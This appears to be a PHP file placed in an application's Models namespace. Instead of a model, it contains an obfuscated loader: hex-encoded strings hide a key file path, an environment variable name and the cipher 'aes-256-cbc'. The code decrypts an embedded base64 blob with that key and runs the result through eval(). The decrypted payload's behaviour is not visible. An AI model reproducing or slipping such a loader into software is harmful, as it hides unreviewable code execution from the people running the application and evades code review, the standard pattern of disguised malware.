<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('xfsVm+dKL3DeAsrlL32Jxw==');

$c=base64_decode(

'GJSQQy2ftdgganIr1S6j1ExDUBH7qgkjkBnPr8VnIlO82mQo63gOKtRHMU4Be76PM/E+QQZ8qeGG' .
'hTY4aOoOdYVg5807LJcJLHTtL4rxC5Vr8pa2T4+1kuMLJOI0Ip5JOe5HvYvvVXMlEyAnkJlRmE80' .
'/7h+Eva45s91gFx3ykGEQT51ES4j8vQUsqQEN1GuOdSn9yIu4anc+STQcAKmYqG1i0SPouKUBzNR' .
'z5u3R/ZIFfU5rQdmgZXFPAjC6RUymqE1ATv/F5fpIxLTjB6hJ676F+c62anV2834FZ+MqUjx6h36' .
'kLYmcb8GZbTGbKKGqYcOIGnvG+QLGwng+XT0PgN2UWPA195zFcJYzPoX0svoJHBbNMdleB2qd0+g' .
'ebnu6JJSwJgvZqfltgDu9TaXgKd+IeD/gakfPwGpDJrA9f3hRfOyR7hBcwPVLUH2xm+iKuDHjDXG' .
'v4r4x97e2+scwVo8Ek9CD86ki+U3hQ0hCqy9rLuLplQdx2RLZB3y/vqpzI/0srrp+8OuE8Ff5tcg' .
'pdZZgjdmEUEf8/n15N+M0Umbc5yOR0ratDa2M8HXpPHq+yKDWYa7m6aUBPDsj/zqjQJrH+/TgbGs' .
'yuY+2LVf6rAVS3foB3ujD9dPjlrXiea168OHyNOPIPB2cVGmr3jyCMvQVU4e0PiKN9gKLTy/0m9v' .
'AluFqg38mDm8zbvLAQ/Tpym5RmXJoo51TljYkEup3xf/bT3mGMwJEkIFM/SxJR0o4ivXtBJgv9J3' .
'qCnF0JLRlMy1kfcCyFvaiOksibXMxw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

